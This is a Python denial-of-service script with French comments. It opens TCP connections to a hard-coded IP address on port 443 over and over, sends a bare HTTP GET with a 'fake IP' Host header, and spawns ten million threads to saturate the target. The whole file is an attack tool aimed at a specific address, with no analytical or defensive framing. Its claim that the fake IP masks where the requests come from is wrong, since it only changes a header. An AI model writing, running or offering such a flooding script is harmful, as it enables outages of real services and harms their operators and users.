import socket
import threading

# Adresse IP ou nom de domaine de la cible
target = '162.210.96.123'  # IP cible ou nom de domaine
# Port utilisé pour la connexion (443 pour HTTPS, 80 pour HTTP)
port = 443  # Port pour HTTPS, ou 80 pour HTTP
# Adresse IP factice pour masquer l'origine des requêtes
fake_ip = '182.21.20.32'

# Variable pour compter le nombre de connexions déjà établies
already_connected = 0

def attack():
    """
    Fonction d'attaque qui établit une connexion, envoie des requêtes, puis ferme la connexion.
    Cette fonction est répétée dans une boucle infinie pour saturer la cible avec des requêtes.
    """
    while 1:
        # Création d'une nouvelle connexion socket TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connexion au serveur cible sur le port spécifié
        s.connect((target, port))
        # Envoi d'une requête HTTP GET
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        # Envoi de l'en-tête HOST avec l'adresse IP factice
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        # Fermeture de la connexion
        s.close()
        
        # Mise à jour du compteur global
        global already_connected
        already_connected += 1
        # Affichage du nombre de connexions établies
        print(already_connected)

# Création et démarrage de 10 millions de threads, chacun exécutant la fonction d'attaque
for i in range(10000000):
    # Création d'un thread pour exécuter la fonction d'attaque
    thread = threading.Thread(target=attack)
    # Démarrage du thread
    thread.start()
